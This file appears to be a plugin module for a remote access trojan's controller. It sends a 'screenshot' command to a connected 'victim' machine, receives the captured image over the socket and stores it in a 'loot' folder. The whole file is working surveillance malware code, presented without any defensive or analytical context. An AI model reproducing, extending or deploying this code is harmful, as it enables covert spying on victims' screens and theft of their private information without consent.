from lib.debug import Debug
import subprocess, os

class module():
    def __init__(self):
        self.Command        = "screenshot"
        self.Name           = "Screenshotter"
        self.Description    = """This command takes a screenshot of the victim's computer."""
        self.Platform       = "multi"

    def _exec(self, dmos, args):
        dmos.conn.send(self.Command.encode())
        # TODO: just fix this shit to be multi plat
        DATE = subprocess.check_output("date", shell=True).rstrip(b'\n').decode("utf-8") + ".png"
        lootFolder = "./loot/screenshots/"
        path = os.path.join(lootFolder, DATE)

        f = open(path, "wb")
        image_data = b''
        while b'FIN' not in (d := dmos.conn.recv(1024)): #FIN
            image_data += d
        f.write(image_data)
        f.close()
        Debug.tprint(f"Screenshot downloaded to loot folder --> {path}")
